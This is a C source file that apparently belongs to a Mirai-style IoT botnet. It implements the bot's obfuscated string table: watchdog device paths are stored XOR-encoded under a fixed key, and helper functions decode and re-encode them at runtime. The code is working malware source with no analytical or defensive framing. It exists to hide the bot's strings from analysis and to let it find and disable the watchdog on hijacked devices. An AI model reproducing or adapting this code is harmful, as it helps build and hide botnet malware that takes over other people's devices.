#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xdeedeebf;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
	add_entry(TABLE_MISC_DOG, "\x4D\x06\x07\x14\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 14); // /dev/watchdog
	add_entry(TABLE_MISC_DOG1, "\x4D\x06\x07\x14\x4D\x0F\x0B\x11\x01\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 19); // /dev/misc/watchdog
	add_entry(TABLE_MISC_DOG2, "\x4D\x06\x07\x14\x4D\x24\x36\x35\x26\x36\x53\x52\x53\x3D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 23); // /dev/FTWDT101_watchdog
	add_entry(TABLE_MISC_DOG3, "\x4D\x06\x07\x14\x4D\x24\x36\x35\x26\x36\x53\x52\x53\x3E\x42\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 24); // /dev/FTWDT101\ watchdog
	add_entry(TABLE_MISC_DOG4, "\x4D\x06\x07\x14\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x52\x62", 15); // /dev/watchdog0
	add_entry(TABLE_MISC_DOG5, "\x4D\x07\x16\x01\x4D\x06\x07\x04\x03\x17\x0E\x16\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 22); // /etc/default/watchdog
	add_entry(TABLE_MISC_DOG6, "\x4D\x11\x00\x0B\x0C\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 15); // /sbin/watchdog
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
